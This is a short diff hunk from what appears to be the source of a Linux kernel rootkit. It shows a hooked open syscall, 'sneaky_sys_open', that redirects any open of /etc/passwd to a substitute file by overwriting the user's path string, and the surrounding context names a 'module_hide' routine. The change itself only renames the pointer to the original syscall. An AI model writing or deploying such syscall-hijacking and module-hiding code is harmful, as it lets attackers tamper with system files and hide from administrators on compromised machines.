@@ -59,7 +59,7 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
 	if(strcmp(pathname, "/etc/passwd") == 0){
 		copy_to_user((void*)pathname, src_file, strlen(src_file)+1);
 	}
-	return original_call_open(pathname, flags, mode);
+	return original_open(pathname, flags, mode);
 }
 
 void module_hide(void)
